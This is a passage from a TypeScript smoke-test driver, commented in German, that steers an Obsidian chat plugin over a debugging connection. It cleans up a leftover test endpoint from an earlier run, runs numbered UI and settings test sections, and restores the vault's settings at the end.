    console.log(`Plugin-Version — Obsidians Speicher: ${plugin.version} · manifest.json auf Platte: ${plugin.aufPlatte ?? 'nicht lesbar'}`);
    if (plugin.aufPlatte !== undefined && plugin.aufPlatte !== plugin.version) {
      console.log(
        '  (Divergenz: Obsidian hat das Manifest beim Vault-Start gelesen und lädt es bei ' +
          'enablePlugin nicht neu. Der gemessene CODE ist trotzdem der deployte — das belegt ' +
          'der sha1-Vergleich oben, nicht diese Nummer.)',
      );
    }
    console.log('');

    // `chatEndpoints === [{ url: SMOKE_ENDPOINT_URL }]` ist eine feste Test-Konfiguration —
    // kein echter Nutzer konfiguriert exakt diese lokale Adresse als einzigen Endpunkt. Ein
    // Rest aus einem per SIGINT/SIGTERM abgebrochenen frueheren Lauf ist daran erkennbar,
    // BEVOR dieser Lauf `vorwert` erfasst — sonst wuerde der Rest als "vorheriger Stand"
    // mitgesnapshotted und am Laufende wiederhergestellt statt entfernt.
    const leftoverEndpoint = await cdp.evaluate<boolean>(`
      const eps = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].data.settings.chatEndpoints ?? [];
      return eps.length === 1 && eps[0]?.url === ${JSON.stringify(SMOKE_ENDPOINT_URL)};
    `);
    record(
      'vor/kein-liegen-gebliebener-endpunkt',
      !leftoverEndpoint,
      leftoverEndpoint
        ? `Test-Endpunkt ${SMOKE_ENDPOINT_URL} gefunden und entfernt — vermutlich Ctrl-C/Crash im vorigen Lauf vor dessen Aufraeumen; dieser Lauf faehrt normal weiter`
        : 'kein Rest in den Settings',
    );
    if (leftoverEndpoint) {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.data.settings.chatEndpoints = [];
        await p.persist();
        return true;
      `);
    }

    vorwert = await cdp.evaluate<string>(`
      return JSON.stringify(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].data.settings);
    `);

    console.log('── 1 · Aus-Zustand');
    await sektionAus(cdp);
    console.log('');
    console.log('── 2 · Chat einschalten');
    await sektionEinschalten(cdp);
    console.log('');
    console.log('── 3 · Einrichtungs-Hinweis');
    await sektionSetupHinweis(cdp);
    console.log('');
    console.log('── 4 · Layout unter langem Verlauf');
    await sektionLayout(cdp);
    console.log('');
    console.log('── 5 · Kontext-Ausklapper');
    await sektionKontext(cdp);
    console.log('');
    console.log('── 6 · Sprache');
    await sektionSprache(cdp);
    console.log('');
    console.log('── 7 · Destruktive Knöpfe');
    await sektionDestruktiv(cdp);
    console.log('');
    console.log('── 8 · Herkunfts-Panel');
    await sektionHerkunft(cdp);
    console.log('');

    console.log('── 9 · Markdown im Chat');
    await sektionMarkdown(cdp);
    console.log('');
    console.log('── 10 · Kontextzeile folgt der Tagesnotiz');
    await sektionKontextSync(cdp);
    console.log('');
    console.log('── 11 · Endpunkte vom Manager');
    await sektionManager(cdp);
    console.log('');
    console.log('── 12 · Echter Endpunkt');
    await sektionEchterEndpunkt(cdp);
    console.log('');
    console.log('── 13 · Sampling-Profile (Abschnitt „Anfrage“, Modus companion)');
    await sektionAnfrage(cdp);

    console.log('');
    console.log('── 14 · Verbindung (Schlüsselbund, Schwärzung, Neutralisierung)');
    await sektionVerbindung(cdp);
    console.log('');
    console.log('── 15 · Streak (laufender Tag, Arbeitstage)');
    await sektionStreak(cdp);
    console.log('');
    console.log('── 16 · Folge-Regel (Stream-Bereich)');
    await sektionFolgeRegel(cdp);
    console.log('');
    console.log('── 17 · Gemma 4 ohne Öffner');
    await sektionGemma(cdp);
    console.log('');
    console.log('── 17b · Denkblock kopierbar');
    await sektionDenkblock(cdp);
    console.log('');
    console.log('── 18 · Pflichtpunkte § 3a (Fokus-Erhalt, Erreichbarkeit)');
    await sektionPflicht(cdp);
    console.log('');

    console.log('── Nicht mechanisch prüfbar (bleibt Hand-Runde)');
    skipped('ton/stimmt-der-ton', 'Schritt 11 der Checkliste — ob sich Antworten richtig anfühlen, ist keine Messung');
    console.log('');
  } finally {
    // Aufräumen darf nie am Ergebnis hängen: auch ein abgebrochener Lauf gibt den Vault
    // so zurück, wie er ihn vorgefunden hat (derselbe Schritt wie beim Abbruch, `beimAbbruch` oben).
    await zustand.schliesse();
    // Nach einem Abbruch beendet das Modul den Prozess selbst (Bilanz, Exit 130).
    if (istAbgebrochen()) return;
    cdp.close();
  }

  // Die Abschlusszeile trägt alle vier Zustände: ein übersprungener oder nie gemessener Punkt gehört IN sie
  // (CORE-TEST-03). `abschluss()` setzt Exit 1 bei Rot ODER nichts gemessen.
  bilanz.abschluss();
  for (const p of bilanz.eintraege()) {
    if (p.zustand === 'rot' || p.zustand === 'nichts-gemessen') console.log(`  - ${p.name}: ${p.detail}`);
  }
  if (herkunftsWarnung !== null) {
    console.log('⚠️  Herkunft des gemessenen Builds ungeprüft — s. Warnung oben.');
  }
}

runDriver(main);
